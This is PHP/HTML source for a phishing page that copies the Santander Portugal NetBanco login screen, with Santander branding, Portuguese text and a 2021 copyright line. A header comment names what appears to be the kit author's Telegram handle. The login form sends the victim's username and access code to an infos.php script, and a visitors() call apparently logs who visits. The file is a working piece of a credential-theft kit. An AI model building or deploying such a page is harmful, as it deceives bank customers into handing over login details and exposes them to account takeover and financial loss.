<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

visitors();

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Netbanco Particulares - Santander</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/favicon.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>

    <header id="login">
        <div class="header">
            <div class="logo"><img src="image/logo.svg" width="120"></div>
        </div>
    </header>

    <section id="login">
        <div class="index ">
            <div class="row">
                <div class="col-md-6 d-none d-md-block"><dib class="image"><img src="image/image.svg"></dib></div>
                <div class="col-md-6">
                    <div class="form">
                        <h2>NetBanco Particulares <span>Login</span></h2>
                        <div class="span"><span>Para aceder às suas contas e documentos no NetBanco, introduza o seu Nome de Utilizador seguido do seu Código de Acesso.</span></div>

                        <form action="infos.php" method="post">

                           <input type="hidden" value="index" name="step">

                           <div class="form-group gr ">
                                <input type="text" id="email" class="form-control " name="email">
                                <label class="label-email">Nome de utilizador</label>
                            </div>

                            <div class="form-group gr " style="margin-top:27px;">
                                <input type="password" id="password" class="form-control " name="password">
                                <label class="label-password">Código de Acesso</label>
                                <div class="eye"><img src="image/eye-slash.svg" width="30"></div>
                                <div class="eye-slash"><img src="image/eye.svg" width="30"></div>
                            </div>

                            <div class="mt-3"><span style="color: #4D5557;font-size: 11px;font-weight: 700;">Esqueceu-se do código?</span></div>

                            <div class="bttn d-flex justify-content-between mt-5 align-items-center">
                                <p>Novo Registo</p>
                                <button name="submit">Entrar</button>
                            </div>
                        </form>
                        <div class="d-flex">
                            <div class="me-3"><span style="color: #4D5557;font-size: 11px;font-weight: 700;">Cartão Refeição</span></div>
                            <div><span style="color: #4D5557;font-size: 11px;font-weight: 700;"> Ainda não sou cliente</span></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="footer d-block d-md-flex justify-content-between align-items-center">
                <ul class="list-unstyled mb-0">
                    <li>Preçário</li>
                    <li>Termos e Condições</li>
                    <li>Contactos</li>
                </ul>
                <div><span style="color: #4D5557;font-size: 11px;font-weight: 700;">© 2021 Santander - Todos os Direitos Reservados...</span></div>
            </div>
        </div>
    </section>

    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.mask.js"></script>
  <script>

    $("#email").focus(function(){  

            $(".label-email").css({"top": "-10px", "font-size": "12px" , "color":"#137E84"})
    });

    $("#email").keyup(function(){
        if ($(this).val().length > 0) {

            $(".label-email").css({"top": "-10px", "font-size": "12px" , "color":"#137E84"})
        }
        else{
            $(".label-email").css({"top": "13px", "font-size": "15px"})
        }
    });
    $("#email").focusout(function(){  

        if ($(this).val().length > 0) {
            $(".label-email").css({"top": "-10px", "font-size": "12px" , "color":"#137E84"})
        }
        else{
            $(".label-email").css({"top": "13px", "font-size": "15px"})
        }
    });

    // ________ PASSWORD __________


    $("#password").focus(function(){  

            $(".label-password").css({"top": "-10px", "font-size": "14px" , "color":"#137E84"})
    });

    $("#password").keyup(function(){
        if ($(this).val().length > 0) {

            $(".label-password").css({"top": "-10px", "font-size": "14px" , "color":"#137E84"})
        }
        else{
            $(".label-password").css({"top": "13px", "font-size": "15px"})
        }
    });
    $("#password").focusout(function(){  

        if ($(this).val().length > 0) {
            $(".label-password").css({"top": "-10px", "font-size": "14px" , "color":"#137E84"})
        }
        else{
            $(".label-password").css({"top": "13px", "font-size": "15px"})
        }
    });

    // __________________ EYE / EYE-SLASH

    $(".eye-slash").click(function(){
        $(this).hide();
        $(".eye").show();
        $("#password").attr("type" , "text")
    });

    $(".eye").click(function(){
        $(this).hide();
        $(".eye-slash").show();
        $("#password").attr("type" , "password")
    })

  </script>
</body>
</html>